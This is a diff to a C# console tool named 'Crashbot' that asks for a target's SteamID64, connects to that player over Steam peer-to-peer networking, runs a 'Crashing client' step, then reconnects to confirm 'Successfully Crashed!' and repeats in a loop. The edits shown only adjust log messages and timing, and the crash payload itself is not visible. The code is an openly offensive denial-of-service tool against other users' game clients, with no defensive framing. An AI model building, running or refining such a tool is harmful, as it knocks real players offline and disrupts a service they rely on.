@@ -52,7 +52,8 @@ namespace Crashbot
 
             Console.Write("Enter target SteamID64: ");
             ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");
-            
+
+            Console.WriteLine("Connecting...");
             var (conn, info) = ConnectAndWait(target, LongTimeoutOptions);
             if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                 Console.WriteLine("Connected!");
@@ -72,7 +73,7 @@ namespace Crashbot
                     Steamworks.SteamNetworkingSockets.RunCallbacks();
 
                     Console.WriteLine("Crashing client...");
-                    Thread.Sleep(300);
+                    Thread.Sleep(500);
 
                     Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, string.Empty, false);
                     break;
@@ -83,13 +84,12 @@ namespace Crashbot
                 }
             }
 
-            // Console.Write("Press any key to continue...");
-            // Console.ReadKey();
-
+            Console.WriteLine("Checking target...");
             var (conn2, info2) = ConnectAndWait(target, ConnectionTimeoutOptions);
 
             bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
             Console.WriteLine(crashed ? "Successfully Crashed!" : "Failed to Crash");
+            Console.WriteLine(Environment.NewLine);
 
             goto start;
         }
@@ -103,7 +103,6 @@ namespace Crashbot
             remoteIdentity.SetSteamID(cSteamID);
 
             HSteamNetConnection conn = SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, options.Length, options);
-            Console.WriteLine("Connecting...");
 
             Thread.Sleep(10);
             Steamworks.SteamAPI.RunCallbacks();
